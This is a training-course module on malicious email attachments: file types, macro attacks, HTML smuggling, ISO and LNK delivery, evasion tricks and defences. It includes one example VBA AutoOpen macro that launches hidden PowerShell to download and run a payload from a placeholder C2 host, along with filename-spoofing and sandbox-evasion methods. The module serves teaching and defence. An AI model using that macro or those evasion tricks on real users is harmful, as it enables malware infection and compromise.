# Unit 6: Technical Social Engineering — Topic 2: Malicious Attachments

## Overview

**Malicious attachments** are files sent via email, messaging platforms, or other channels that contain hidden malware, exploits, or payloads designed to compromise the recipient's system. They remain one of the primary initial access vectors, combining social engineering (convincing the user to open the file) with technical exploitation (the payload within the file).

---

## 1. Types of Malicious Attachments

```
ATTACHMENT CATEGORIES:

OFFICE DOCUMENTS (Most Common):
  → Word (.doc, .docx, .docm)
  → Excel (.xls, .xlsx, .xlsm)
  → PowerPoint (.ppt, .pptx, .pptm)
  → Attack: VBA macros, DDE, OLE objects
  → Trigger: "Enable Content" / "Enable Editing"

PDF FILES:
  → Adobe PDF (.pdf)
  → Attack: JavaScript execution
  → Attack: Embedded files/links
  → Attack: Exploit reader vulnerabilities
  → Often trusted by users

ARCHIVE FILES:
  → ZIP, RAR, 7Z, TAR.GZ
  → Contains executable disguised as document
  → Password-protected (bypasses email scanning)
  → Double extensions: invoice.pdf.exe
  → ISO/IMG files (mount as disk, bypass MOTW)

HTML FILES:
  → .html, .htm attachments
  → Opens in browser locally
  → Credential harvesting page
  → JavaScript-based attacks
  → HTML smuggling (builds malware from data)

EXECUTABLE/SCRIPT FILES:
  → .exe, .scr, .bat, .cmd, .ps1
  → .js, .vbs, .wsf (script files)
  → .lnk (shortcut files with commands)
  → .hta (HTML Applications)
  → Often blocked by email gateways
  → Hidden in archives to bypass

DISK IMAGE FILES:
  → .iso, .img, .vhd, .vhdx
  → Mount as virtual drive
  → Bypass Mark of the Web (MOTW)
  → Contains executables inside
  → Growing in popularity post-macro blocking
```

---

## 2. Macro-Based Attacks

```
VBA MACRO ATTACK FLOW:

1. VICTIM RECEIVES EMAIL:
   → "Please review the attached invoice"
   → Attachment: Invoice_2024.docm

2. VICTIM OPENS DOCUMENT:
   ┌────────────────────────────────────────┐
   │  ⚠ SECURITY WARNING                   │
   │  Macros have been disabled.            │
   │  [Enable Content]                      │
   └────────────────────────────────────────┘
   
   Document shows blurred content with message:
   "This document was created in an older version
    of Microsoft Office. Click 'Enable Content'
    to view the document."

3. USER CLICKS "ENABLE CONTENT":
   → VBA macro executes
   → Downloads malware from C2 server
   → Or drops embedded payload
   → Establishes persistence
   → Reverse shell to attacker

MACRO CODE EXAMPLE (Simplified):
  Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -w hidden -ep bypass "
    cmd = cmd & "-c IEX(New-Object Net.WebClient)"
    cmd = cmd & ".DownloadString('http://c2/payload')"
    Shell cmd, vbHide
  End Sub

MICROSOFT'S MACRO BLOCKING (2022):
  → VBA macros blocked by default for
    internet-downloaded Office files
  → Attackers shifted to:
    - ISO/IMG files (bypass MOTW)
    - LNK files
    - HTML smuggling
    - OneNote attachments
    - XLL (Excel add-in) files
```

---

## 3. Modern Attack Techniques

```
HTML SMUGGLING:
  → HTML file contains encoded payload
  → JavaScript decodes and creates file
  → Automatically downloads to victim's computer
  → Bypasses email gateway (no attachment)
  → User just needs to open the HTML file

ISO/IMG DELIVERY:
  → Disk image contains malicious files
  → When opened, mounts as virtual drive
  → Files inside don't have MOTW flag
  → Macros/executables run without warning
  → Popular post-macro-blocking era

LNK (SHORTCUT) FILES:
  → Windows shortcut file
  → Target: cmd.exe or powershell.exe
  → Arguments contain malicious commands
  → Can have custom icon (looks like PDF, Word)
  → Small file size, executes immediately

ONENOTE ATTACKS:
  → .one files can embed files
  → "Double-click to view" overlay
  → Hidden embedded scripts behind image
  → OneNote doesn't have macro security
  → Microsoft added restrictions in 2023

XLL FILES (Excel Add-ins):
  → .xll files are DLLs loaded by Excel
  → Execute when "Enable" is clicked
  → Arbitrary code execution
  → Less well-known = less blocked
```

---

## 4. Evasion Techniques

```
BYPASSING DETECTION:

ENCRYPTION/PASSWORD PROTECTION:
  → Password-protected ZIP/RAR files
  → "Password is in the email body"
  → Email gateways can't scan encrypted archives
  → Very common evasion technique

OBFUSCATION:
  → Encoded/encrypted macro code
  → String concatenation to hide commands
  → Environment variable abuse
  → XOR encoding of payloads
  → Base64 encoded PowerShell

SANDBOX EVASION:
  → Check for VM indicators
  → Delay execution (sleep timers)
  → Require user interaction to trigger
  → Check for minimum RAM/CPU
  → Detect analysis tools running
  → Only execute if document scrolled

FILE FORMAT TRICKS:
  → Right-to-Left Override (RTLO)
    invoice_fdp.exe → invoice_exe.pdf (visual)
  → Double extensions: report.pdf.exe
  → Unicode characters in filenames
  → Very long filenames (hide extension)
  → Exploit filename display truncation
```

---

## 5. Defending Against Malicious Attachments

```
EMAIL GATEWAY CONTROLS:
  → Block high-risk file types (.exe, .scr, .js, .vbs)
  → Block password-protected archives
  → Sandbox suspicious attachments
  → Strip macros from Office documents
  → URL rewriting for links in attachments
  → Content disarm and reconstruction (CDR)

ENDPOINT CONTROLS:
  → Block macro execution (Group Policy)
  → Application whitelisting
  → EDR with behavioral detection
  → Protected View in Office applications
  → Disable auto-mount of ISO/IMG files
  → File extension visibility enabled

USER TRAINING:
  → Never enable macros in unexpected documents
  → Verify sender before opening attachments
  → Be suspicious of password-protected archives
  → Report suspicious attachments
  → Don't override security warnings

ORGANIZATIONAL:
  → Secure email gateway (SEG)
  → Attachment sandboxing
  → Threat intelligence integration
  → Incident response procedures
  → Regular phishing simulations
```

---

## Summary Table

| Attachment Type | Attack Method | User Action | Detection |
|----------------|--------------|-------------|-----------|
| Office macro | VBA code execution | Enable Content | Medium |
| PDF | JavaScript/exploits | Open file | Medium |
| Archive | Hidden executable | Extract and run | Hard (if encrypted) |
| HTML | Smuggling/harvesting | Open in browser | Hard |
| ISO/IMG | MOTW bypass | Mount and run | Medium |
| LNK | Command execution | Double-click | Medium |

---

## Revision Questions

1. What are the most common types of malicious attachments?
2. How do VBA macro attacks work and how has Microsoft responded?
3. What modern techniques replaced macro attacks after Microsoft's blocking?
4. How do attackers evade email security scanning?
5. What defense-in-depth approach protects against malicious attachments?

---

*Previous: [01-watering-hole-attacks.md](01-watering-hole-attacks.md) | Next: [03-link-manipulation.md](03-link-manipulation.md)*

---

*[Back to README](../README.md)*
